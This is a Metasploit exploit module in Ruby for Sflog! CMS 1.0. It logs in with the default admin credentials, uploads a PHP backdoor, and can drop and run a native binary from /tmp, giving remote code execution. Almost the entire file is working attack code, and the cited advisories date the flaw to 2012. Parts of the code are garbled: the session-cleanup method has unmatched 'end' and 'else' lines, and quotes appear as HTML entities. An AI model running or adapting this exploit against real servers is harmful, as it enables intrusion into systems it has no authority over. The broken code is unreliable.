# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::EXE

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => "Sflog! CMS 1.0 Arbitrary File Upload Vulnerability",
      &#039;Description&#039;    => %q{
        This module exploits multiple design flaws in Sflog 1.0.  By default, the CMS has
        a default admin credential of "admin:secret", which can be abused to access
        administrative features such as blogs management.  Through the management
        interface, we can upload a backdoor that&#039;s accessible by any remote user, and then
        gain arbitrary code execution.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;dun&#039;,    #Discovery, PoC
          &#039;sinn3r&#039;  #Metasploit
        ],
      &#039;References&#039;     =>
        [
          [&#039;OSVDB&#039;, &#039;83767&#039;],
          [&#039;EDB&#039;, &#039;19626&#039;]
        ],
      &#039;Payload&#039;        =>
        {
          &#039;BadChars&#039; => "\x00"
        },
      &#039;DefaultOptions&#039;  =>
        {
          &#039;ExitFunction&#039; => "none"
        },
      &#039;Platform&#039;       => [&#039;linux&#039;, &#039;php&#039;],
      &#039;Targets&#039;        =>
        [
        [ &#039;Generic (PHP Payload)&#039;, { &#039;Arch&#039; => ARCH_PHP, &#039;Platform&#039; => &#039;php&#039; }  ],
        [ &#039;Linux x86&#039;            , { &#039;Arch&#039; => ARCH_X86, &#039;Platform&#039; => &#039;linux&#039;} ]
        ],
      &#039;Privileged&#039;     => false,
      &#039;DisclosureDate&#039; => "Jul 06 2012",
      &#039;DefaultTarget&#039;  => 0))

    register_options(
      [
        OptString.new(&#039;TARGETURI&#039;, [true, &#039;The base directory to sflog!&#039;, &#039;/sflog/&#039;]),
        OptString.new(&#039;USERNAME&#039;,  [true, &#039;The username to login with&#039;, &#039;admin&#039;]),
        OptString.new(&#039;PASSWORD&#039;,  [true, &#039;The password to login with&#039;, &#039;secret&#039;])
      ], self.class)
  end


  def check
    target_uri.path << &#039;/&#039; if target_uri.path[-1,1] != &#039;/&#039;
    base = File.dirname("#{target_uri.path}.")

    res = send_request_raw({&#039;uri&#039;=>"#{base}/index.php"})

    if not res
      return Exploit::CheckCode::Unknown
    elsif res and res.body =~ /\<input type\=\"hidden\" name\=\"sitesearch\" value\=\"www\.thebonnotgang\.com\/sflog/
      return Exploit::CheckCode::Detected
    else
      return Exploit::CheckCode::Safe
    end
  end


  #
  # Embed our binary in PHP, and then extract/execute it on the host.
  #
  def get_write_exec_payload(fname, data)
    p = Rex::Text.encode_base64(generate_payload_exe)
    php = %Q|
    <?php
    $f = fopen("#{fname}", "wb");
    fwrite($f, base64_decode("#{p}"));
    fclose($f);
    exec("chmod 777 #{fname}");
    exec("#{fname}");
    ?>
    |
    php = php.gsub(/^\t\t/, &#039;&#039;).gsub(/\n/, &#039; &#039;)
    return php
  end


  def on_new_session(cli)
      cli.core.use("stdapi") if not cli.ext.aliases.include?("stdapi")
    end

    @clean_files.each do |f|
      print_status("#{@peer} - Removing: #{f}")
      begin
          cli.fs.file.rm(f)
        else
          cli.shell_command_token("rm #{f}")
        end
      rescue ::Exception => e
        print_error("#{@peer} - Unable to remove #{f}: #{e.message}")
      end
    end
  end


  #
  # login unfortunately is needed, because we need to make sure blogID is set, and the upload
  # script (uploadContent.inc.php) doesn&#039;t actually do that, even though we can access it
  # directly.
  #
  def do_login(base)
    res = send_request_cgi({
      &#039;method&#039;    => &#039;POST&#039;,
      &#039;uri&#039;       => "#{base}/admin/login.php",
      &#039;vars_post&#039; => {
        &#039;userID&#039;   => datastore[&#039;USERNAME&#039;],
        &#039;password&#039; => datastore[&#039;PASSWORD&#039;]
      }
    })

    if res and res.headers[&#039;Set-Cookie&#039;] =~ /PHPSESSID/ and res.body !~ /\<i\>Access denied\!\<\/i\>/
      return res.headers[&#039;Set-Cookie&#039;]
    else
      return &#039;&#039;
    end
  end


  #
  # Upload our payload, and then execute it.
  #
  def upload_exec(cookie, base, php_fname, p)
    data = Rex::MIME::Message.new
    data.add_part(&#039;download&#039;, nil, nil, "form-data; name=\"blogID\"")
    data.add_part(&#039;7&#039;, nil, nil, "form-data; name=\"contentType\"")
    data.add_part(&#039;3000&#039;, nil, nil, "form-data; name=\"MAX_FILE_SIZE\"")
    data.add_part(p, &#039;text/plain&#039;, nil, "form-data; name=\"fileID\"; filename=\"#{php_fname}\"")

    # The app doesn&#039;t really like the extra "\r\n", so we need to remove the newline.
    post_data = data.to_s
    post_data = post_data.gsub(/^\r\n\-\-\_Part\_/, &#039;--_Part_&#039;)

    print_status("#{@peer} - Uploading payload (#{p.length.to_s} bytes)...")
    res = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039;    => "#{base}/admin/manage.php",
      &#039;ctype&#039;  => "multipart/form-data; boundary=#{data.bound}",
      &#039;data&#039;   => post_data,
      &#039;cookie&#039; => cookie,
      &#039;headers&#039; => {
        &#039;Referer&#039; => "http://#{rhost}#{base}/admin/manage.php",
        &#039;Origin&#039;  => "http://#{rhost}"
      }
    })

    if not res
      print_error("#{@peer} - No response from host")
      return
    end

    target_path = "#{base}/blogs/download/uploads/#{php_fname}"
    print_status("#{@peer} - Requesting &#039;#{target_path}&#039;...")
    res = send_request_raw({&#039;uri&#039;=>target_path})
    if res and res.code == 404
      print_error("#{@peer} - Upload unsuccessful: #{res.code.to_s}")
      return
    end

    handler
  end


  def exploit
    @peer = "#{rhost}:#{rport}"

    target_uri.path << &#039;/&#039; if target_uri.path[-1,1] != &#039;/&#039;
    base = File.dirname("#{target_uri.path}.")

    print_status("#{@peer} - Attempt to login as &#039;#{datastore[&#039;USERNAME&#039;]}:#{datastore[&#039;PASSWORD&#039;]}&#039;")
    cookie = do_login(base)

    if cookie.empty?
      print_error("#{@peer} - Unable to login")
      return
    end

    php_fname =  "#{Rex::Text.rand_text_alpha(5)}.php"
    @clean_files = [php_fname]

    case target[&#039;Platform&#039;]
    when &#039;php&#039;
      p = "<?php #{payload.encoded} ?>"
    when &#039;linux&#039;
      bin_name = "#{Rex::Text.rand_text_alpha(5)}.bin"
      @clean_files << bin_name
      bin = generate_payload_exe
      p = get_write_exec_payload("/tmp/#{bin_name}", bin)
    end

    upload_exec(cookie, base, php_fname, p)
  end
end



